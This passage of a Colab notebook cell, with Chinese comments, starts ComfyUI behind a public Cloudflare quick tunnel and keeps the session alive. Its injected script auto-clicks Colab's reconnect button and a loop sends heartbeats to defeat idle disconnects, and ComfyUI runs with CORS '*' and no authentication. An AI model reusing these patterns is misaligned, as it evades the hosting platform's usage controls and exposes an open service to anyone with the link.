        if os.path.exists("/content/cf.log"):
            txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
            m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
            if m and ("Registered tunnel connection" in txt or "Connection" in txt):
                cf_url = m.group(0)
                break
    if not cf_url and os.path.exists("/content/cf.log"):
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read())
        if m:
            cf_url = m.group(0)
    if cf_url:
        for _ in range(25):
            try:
                r = urllib.request.urlopen(urllib.request.Request(cf_url + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=3)
                if r.status == 200:
                    break
            except Exception:
                time.sleep(0.8)
    return cf_url

cf_url = _ensure_cf_tunnel()
from IPython.display import clear_output
clear_output(wait=True)
print("="*65)
print("🎉 挂载与启动全部完成！（网址保持固定不断连，随时可点击切换其他模型选项）")
print("="*65)
print(f"🌐 【首选直连 · Cloudflare 免403极速缓存通道】：\n👉 {cf_url}")
print("="*65)

display(HTML(f"""
<div style="margin:12px 0;padding:16px;border-radius:10px;background:#1e293b;color:#fff;font-family:sans-serif;">
  <div style="font-size:16px;font-weight:bold;margin-bottom:12px;color:#4ade80;">✅ 模型挂载与 ComfyUI 已就绪（网址固定不断连）！</div>
  <a href="{cf_url}" target="_blank" style="display:inline-block;padding:10px 22px;background:#22c55e;color:#fff;text-decoration:none;border-radius:6px;font-weight:bold;margin-right:12px;">🌐 点击打开 ComfyUI (Cloudflare 首选通道)</a>
  
  <div style="margin-top:10px;font-size:12px;color:#94a3b8;">🛡️ 已开启后台自动防休眠保活心跳（您在 ComfyUI 网页操作时，Colab 不会因闲置自动断连关机）</div>
</div>
<script>
  if (!window.__minimaxColabKeepAlive) {{
    window.__minimaxColabKeepAlive = setInterval(() => {{
      try {{
        const btn = document.querySelector('colab-connect-button');
        if (btn && btn.shadowRoot) {{
          const text = btn.shadowRoot.textContent || '';
          if (text.includes('Reconnect') || text.includes('重新连接')) {{
            btn.click();
          }}
        }}
        fetch(window.location.href, {{method: 'HEAD', cache: 'no-store'}}).catch(()=>{{}});
      }} catch(e) {{}}
    }}, 60000);
  }}
</script>
"""))

try:
    output.eval_js(f'window.open("{cf_url}", "_blank")')
except Exception:
    pass

# === [AGY_FOREGROUND_GUARDIAN_V2] 保持 Colab 内核 Busy 防闲置断连 + ComfyUI/隧道崩溃 3秒自动复活 ===
print("🛡️ [防断连守护已启动] 当前单元格将保持运行状态以防止 Colab 闲置回收（如需切换其他模型格，点左上角 ⏹️ 停止即可）...")
_guardian_tick = 0
try:
    while True:
        time.sleep(15)
        _guardian_tick += 1
        # 1. 检查 ComfyUI 8188 端口，若因显存/内存峰值闪退则 3 秒内原地自动重启（网址不变）
        if not _is_port_open(8188):
            print("⚠️ 检测到 ComfyUI 引擎意外退出，正在 3 秒内自动重启恢复（原 Cloudflare 网址保持不变）...")
            subprocess.Popen(
                ["bash", "-c", "nohup python main.py --dont-print-server --enable-cors-header '*' > /content/comfyui.log 2>&1 &"],
                cwd="/content/ComfyUI",
                start_new_session=True
            )
            for _ in range(90):
                if _is_port_open(8188):
                    print("✅ ComfyUI 引擎已自动复活！切回网页即可继续使用。")
                    break
                time.sleep(0.5)
        # 2. 检查 cloudflared 进程是否存活
        if subprocess.run(["pgrep", "-x", "cloudflared"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
            print("⚠️ 检测到 Cloudflare 隧道进程断开，正在自动重连...")
            cf_url = _ensure_cf_tunnel()
            print(f"✅ 隧道已重新连通：👉 {cf_url}")
        # 3. 每 45 秒通过 Colab 官方双向 RPC 通道发送一次轻量心跳，重置前端闲置计时器
        if _guardian_tick % 3 == 0:
            try:
                from google.colab import output as _colab_out
                _colab_out.eval_js("1", ignore_result=True)
            except Exception:
                pass
except KeyboardInterrupt:
    print("⏹️ 已手动停止守护循环（后台 ComfyUI 与隧道仍保持运行，可随时运行其他单元格）。")
